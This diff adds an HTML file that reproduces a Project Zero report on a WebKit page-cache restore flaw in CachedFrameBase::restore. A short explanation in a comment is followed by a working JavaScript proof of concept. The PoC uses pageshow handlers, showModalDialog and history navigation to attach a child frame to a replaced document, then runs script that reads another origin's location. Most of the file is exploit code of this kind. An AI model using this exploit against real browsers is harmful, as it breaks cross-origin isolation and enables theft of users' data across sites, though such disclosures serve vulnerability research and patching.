@@ -1,0 +1,89 @@
+<!--
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1151
+
+Here is a snippet of CachedFrameBase::restore which is invoked when cached frames are restored.
+
+void CachedFrameBase::restore()
+{
+    ...
+    for (auto& childFrame : m_childFrames) {
+        ASSERT(childFrame->view()->frame().page());
+        frame.tree().appendChild(childFrame->view()->frame());
+        childFrame->open(); <----- (a)
+    }
+    ...
+    // FIXME: update Page Visibility state here.
+    // https://bugs.webkit.org/show_bug.cgi?id=116770
+    m_document->enqueuePageshowEvent(PageshowEventPersisted);
+
+    HistoryItem* historyItem = frame.loader().history().currentItem();
+    if (historyItem && historyItem->stateObject())
+        m_document->enqueuePopstateEvent(historyItem->stateObject());
+
+    frame.view()->didRestoreFromPageCache();
+}
+
+enqueuePageshowEvent and enqueuePopstateEvent are named "enqueue*", but actually those *dispatch* window events that may fire JavaScript handlers synchronously. 
+
+At (a), |open| method may invoke |CachedFrameBase::restore| method again. Thus, the parent frame's document may be replaced while |open| is called in the iteration, the next child frame is attached to the parent frame holding the replaced document.
+
+PoC:
+-->
+
+<html>
+<body>
+<script>
+
+function createURL(data, type = 'text/html') {
+    return URL.createObjectURL(new Blob([data], {type: type}));
+}
+
+function navigate(w, url) {
+    let a = w.document.createElement('a');
+    a.href = url;
+    a.click();
+}
+
+function main() {
+    let i0 = document.body.appendChild(document.createElement('iframe'));
+    let i1 = document.body.appendChild(document.createElement('iframe'));
+
+    i0.contentWindow.onpageshow = () => {
+        navigate(window, 'https://abc.xyz/');
+
+        showModalDialog(createURL(`
+<script>
+let it = setInterval(() => {
+    try {
+        opener.document.x;
+    } catch (e) {
+        clearInterval(it);
+        window.close();
+    }
+}, 10);
+</scrip` + 't>'));
+
+    };
+
+    i1.contentWindow.onpageshow = () => {
+        i1.srcdoc = '<script>alert(parent.location);</scrip' + 't>';
+        navigate(i1.contentWindow, 'about:srcdoc');
+    };
+
+    navigate(window, createURL(`<html><head></head><body>Click anywhere<script>
+window.onclick = () => {
+    window.onclick = null;
+
+    history.back();
+};
+
+</scrip` + `t></body></html>`));
+}
+
+window.onload = () => {
+    setTimeout(main, 0);
+};
+
+</script>
+</body>
+</html>
